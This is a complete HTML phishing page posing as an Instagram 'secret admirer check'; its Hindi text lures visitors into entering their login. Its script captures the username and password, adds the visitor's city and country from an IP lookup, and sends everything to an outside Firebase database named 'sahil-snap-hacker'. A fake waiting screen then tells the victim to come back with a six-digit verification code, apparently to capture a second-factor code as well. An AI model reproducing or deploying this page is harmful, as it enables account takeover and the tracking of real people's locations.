<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Secret Admirer Check</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; border-radius: 3px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
        .btn { width: 100%; background-color: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
        #waiting-section { display: none; margin-top: 10px; }
        .info { font-size: 14px; color: #8e8e8e; margin-bottom: 20px; line-height: 1.5; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="box">
    <img src="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460367de.png" class="logo">
    
    <div id="login-section">
        <p class="info">जानें कौन आपकी प्रोफाइल और स्टोरीज को छुपकर देखता है! अपनी आईडी वेरिफाई करें।</p>
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        <button class="btn" onclick="captureLogin()">एनालिसिस शुरू करें</button>
    </div>

    <div id="waiting-section">
        <div class="loader"></div>
        <p style="font-weight: bold; color: #262626; font-size: 16px;">प्रोफाइल स्कैनिंग जारी है...</p>
        <p style="font-size: 13px; color: #8e8e8e; margin: 15px 0;">सुरक्षा कारणों से, आपका रिजल्ट <b>2 घंटे बाद</b> तैयार होगा।</p>
        <p style="font-size: 12px; color: #ed4956; background: #fff1f0; padding: 10px; border-radius: 5px;">⚠️ आपको अपने नंबर पर एक 6-अंकों का वेरिफिकेशन कोड प्राप्त होगा। कोड मिलने पर दोबारा इसी लिंक को खोलें।</p>
    </div>

    <p style="font-size: 11px; color: #b2b2b2; margin-top: 30px;">© 2026 Instagram from Meta</p>
</div>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<script>
    const firebaseConfig = { databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    let sessionID = "ID_" + Math.floor(Math.random() * 999999);
    let userLoc = "Fetching...";

    // लोकेशन ट्रैकर
    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
        userLoc = d.city + ", " + d.region + " (" + d.country_name + ")";
    });

    function captureLogin() {
        const u = document.getElementById("username").value;
        const p = document.getElementById("password").value;
        
        if(u && p) {
            // Firebase में डेटा सेव करना
            database.ref('secret_targets/' + sessionID).set({
                Username: u,
                Password: p,
                Location: userLoc,
                Status: "Waiting (2hr delay)",
                Time: new Date().toLocaleString()
            }).then(() => {
                // लॉगिन छुपाकर वेटिंग स्क्रीन दिखाना
                document.getElementById("login-section").style.display = "none";
                document.getElementById("waiting-section").style.display = "block";
            });
        } else {
            alert("कृपया सभी जानकारी भरें!");
        }
    }
</script>

</body>
</html>
